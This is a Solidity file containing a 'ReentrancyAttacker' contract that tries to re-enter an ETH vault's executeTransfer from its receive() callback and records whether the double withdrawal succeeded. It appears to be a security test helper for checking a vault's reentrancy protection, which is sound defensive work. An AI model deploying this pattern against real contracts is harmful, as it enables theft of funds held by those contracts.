// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IEthRiskVault {
    function requestTransfer(address payable recipient)
        external payable returns (bytes32);

    function executeTransfer(bytes32 requestId) external;
}

contract ReentrancyAttacker {
    IEthRiskVault public vault;
    bytes32 public targetRequestId;
    bool public attackAttempted;
    bool public attackSucceeded;

    constructor(address vaultAddress) {
        vault = IEthRiskVault(vaultAddress);
    }

    function requestAttack() external payable {
        targetRequestId = vault.requestTransfer{value: msg.value}(
            payable(address(this))
        );
    }

    function attack() external {
        vault.executeTransfer(targetRequestId);
    }

    receive() external payable {
        attackAttempted = true;

        try vault.executeTransfer(targetRequestId) {
            attackSucceeded = true;
        } catch {
            attackSucceeded = false;
        }
    }
}